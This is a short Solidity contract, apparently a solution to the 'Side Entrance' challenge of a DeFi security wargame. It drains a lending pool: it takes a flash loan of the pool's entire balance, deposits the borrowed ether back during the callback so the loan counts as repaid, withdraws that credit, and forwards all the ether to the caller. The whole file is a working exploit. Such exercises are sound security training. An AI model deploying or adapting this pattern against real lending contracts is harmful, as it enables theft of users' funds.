// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool sc,) = msg.sender.call{value: address(this).balance}("");
        require(sc, "Transfer failed.");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
